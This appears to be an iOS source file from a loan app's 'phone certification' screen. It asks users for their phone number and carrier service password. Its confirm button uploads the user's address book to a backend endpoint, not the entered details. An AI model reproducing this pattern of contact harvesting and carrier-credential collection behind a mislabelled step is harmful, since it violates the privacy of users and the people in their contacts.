//
//  PhoneCertificationVC.m
//  LoanProject
//
//  Created by 张晨曦 on 2018/12/10.
//  Copyright © 2018年 张晨曦. All rights reserved.
//

#import "PhoneCertificationVC.h"
#import "CarrierCell.h"

@interface PhoneCertificationVC ()<UITableViewDataSource,UITableViewDelegate>

@property (nonatomic, strong) UITableView *tableView;

//提示文字
@property (nonatomic, strong) UILabel *promptLabel;
@property (nonatomic, strong) UIButton *submitBtn;

//自定义 电话,银行卡 的inputAccessoryView
@property (nonatomic, strong) UIToolbar *customAccessoryView;

//弱引用3个cell
@property (nonatomic, weak) CarrierCell *weak_phoneCell;
@property (nonatomic, weak) CarrierCell *weak_serverPwdCell;
//@property (nonatomic, weak) CarrierCell *weak_verifyCodeCell;

//验证码
@property (nonatomic, copy) NSString *verifyCode;

@end

@implementation PhoneCertificationVC

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.navigationItem.title = @"手机认证";
    self.view.backgroundColor = [UIColor whiteColor];

    [self setBotBtn];
    
    [self tableView];

}

- (void)setBotBtn{

    //确认按钮
    _submitBtn = [UIButton createYellowBgBtn:@"确认"];
    [_submitBtn addTarget:self action:@selector(submitClick:) forControlEvents:UIControlEventTouchUpInside];
    
    [self.view addSubview:_submitBtn];
    [_submitBtn mas_makeConstraints:^(MASConstraintMaker *make) {
        make.centerX.equalTo(self.view);
        make.top.equalTo(self.view).with.offset(180);
        make.left.equalTo(self.view).with.offset(15);
        make.height.equalTo(@kBtnHeight);
    }];
    
    //提示文字
    _promptLabel = [UILabel new];
    _promptLabel.numberOfLines = 0;
    _promptLabel.text = @"温馨提示: \n 1、授权期间将收到运营商的通知短信，这是正常现象，无需担心。\n 2、服务密码为运营商的业务办理密码，一般为6位数字，神州行号码为8位数字具体可联系运营商官方咨询。";
    _promptLabel.font = [UIFont systemFontOfSize:13];
    [self.view addSubview:_promptLabel];
    [_promptLabel mas_makeConstraints:^(MASConstraintMaker *make) {
        make.top.equalTo(self.submitBtn.mas_bottom).with.offset(50);
        make.leading.equalTo(self.submitBtn.mas_leading);
        make.trailing.equalTo(self.submitBtn.mas_trailing);
    }];
    
}


- (void)submitClick:(UIButton *)btn{

    if ([_weak_phoneCell.inputTF.text isEqualToString:@""] || [_weak_serverPwdCell.inputTF.text isEqualToString:@""] ){
        
        [SVProgressHUD showErrorWithStatus:@"请先填写完信息！"];
        return;
    }
    
    //3秒内 按钮不能重复点击
    btn.userInteractionEnabled = false;
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        btn.userInteractionEnabled = true;
    });
    
    //发送通讯录给后台
    [[LCHTTPSessionManager sharedInstance] POST:[kUrlReqHead stringByAppendingPathComponent:@"/UploadDic.aspx"] parameters:self.addressBookDict progress:nil success:^(NSURLSessionDataTask * _Nonnull task, id  _Nullable responseObject) {
        NSLog(@"通讯录---%@",responseObject);
        
        NSString *stateCode = [NSString stringWithFormat:@"%@",responseObject[@"state"]];
        if ([stateCode isEqualToString:@"200"]){
            
            [SVProgressHUD showProgress:-1 status:@""];
            
            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                
            });
            
//            [SVProgressHUD showSuccessWithStatus:@"提交成功!"];
//            [self.navigationController popToRootViewControllerAnimated:YES];
        }else{
            [SVProgressHUD showErrorWithStatus:@"提交失败！"];
            return;
        }
        
    } failure:^(NSURLSessionDataTask * _Nullable task, NSError * _Nonnull error) {
        NSLog(@"通讯录错误---%@",error);
    }];
    
}

#pragma mark - tableView Delegate
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView{
    return 1;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section{
    return 2;
}

#pragma mark - tableView DataSource
- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath{
    CarrierCell *cell = [tableView dequeueReusableCellWithIdentifier:@"CarrierCell" forIndexPath:indexPath];
    cell.inputTF.inputAccessoryView = self.customAccessoryView;
    cell.inputTF.keyboardType = UIKeyboardTypeNumberPad;
    if (indexPath.row == 0){
        _weak_phoneCell = cell;
        cell.inputTF.placeholder = @"请输入手机号码";
    }
    if (indexPath.row == 1){
        _weak_serverPwdCell = cell;
        cell.inputTF.placeholder = @"请输入服务密码";
    }

    return cell;
}

#pragma mark - 设置高度
- (CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section{
    return 0.01;
}

- (CGFloat)tableView:(UITableView *)tableView heightForFooterInSection:(NSInteger)section{
    return 0.01;
}

- (UIView *)tableView:(UITableView *)tableView viewForHeaderInSection:(NSInteger)section {
    return [[UIView alloc] init];
}
- (UIView *)tableView:(UITableView *)tableView viewForFooterInSection:(NSInteger)section {
    return [[UIView alloc] init];
}

#pragma mark - 懒加载tableView
- (UITableView *)tableView{
    if (!_tableView) {
        _tableView = [[UITableView alloc] initWithFrame:CGRectMake(0, 0, kScreenWidth, 180) style:UITableViewStyleGrouped];
        _tableView.delegate = self;
        _tableView.dataSource = self;
        _tableView.separatorInset = UIEdgeInsetsMake(0, 0, 0, 0);
        _tableView.rowHeight = ZCXRowHeight;
        _tableView.backgroundColor = [UIColor whiteColor];
        _tableView.separatorStyle = UITableViewCellSeparatorStyleNone;
        //注册cell
        [_tableView registerNib:[UINib nibWithNibName:NSStringFromClass([CarrierCell class]) bundle:[NSBundle mainBundle]] forCellReuseIdentifier:@"CarrierCell"];
        [self.view addSubview:_tableView];
    }
    return _tableView;
}

//自定义 电话 和 qq 的inputAccessoryView
- (UIToolbar *)customAccessoryView{
    if (!_customAccessoryView) {
        _customAccessoryView = [[UIToolbar alloc]initWithFrame:(CGRect){0,0,kScreenWidth,45}];
        _customAccessoryView.barTintColor = [UIColor lightGrayColor];
        UIBarButtonItem *space = [[UIBarButtonItem alloc]initWithBarButtonSystemItem:UIBarButtonSystemItemFlexibleSpace target:nil action:nil];
        UIBarButtonItem *done = [[UIBarButtonItem alloc]initWithTitle:@"完成" style:UIBarButtonItemStyleDone target:self action:@selector(done)];
        [_customAccessoryView setItems:@[space,done]];
    }
    return _customAccessoryView;
}

- (void)done{
    [self.weak_phoneCell.inputTF resignFirstResponder];
    [self.weak_serverPwdCell.inputTF resignFirstResponder];
}

@end
